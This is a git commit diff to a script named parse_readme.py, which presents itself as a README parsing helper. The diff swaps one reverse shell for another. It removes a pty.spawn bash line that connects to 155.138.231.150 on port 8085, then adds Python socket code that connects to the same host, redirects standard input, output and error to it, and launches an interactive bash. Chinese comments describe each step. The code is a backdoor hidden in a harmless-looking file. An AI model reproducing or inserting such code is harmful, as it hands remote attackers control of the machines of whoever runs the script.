d537eb5b7791865e445ffb2981ea9e78d23af2b9
hi <wooluo@126.com>
2024-08-23 16:25:08 +0800

    Update parse_readme.py

--- src/scripts/parse_readme.py
+++ src/scripts/parse_readme.py
@@ -2,10 +2,23 @@ import re
 import glob
 import pty
 import os
-os.environ['PATH'] = '/usr/bin:/bin:/usr/sbin:/sbin'  # 确保包含正确的路径
 
+import socket
+import subprocess
 
-pty.spawn("/usr/bin/bash -i >& /dev/tcp/155.138.231.150/8085 0>&1")
+# 创建一个套接字对象
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# 连接到远程服务器
+s.connect(("155.138.231.150", 8085))
+
+# 将标准输入、输出和错误重定向到套接字
+os.dup2(s.fileno(), 0)  # 标准输入
+os.dup2(s.fileno(), 1)  # 标准输出
+os.dup2(s.fileno(), 2)  # 标准错误
+
+# 执行一个Shell
+subprocess.call(["/bin/bash", "-i"])
 
 
 
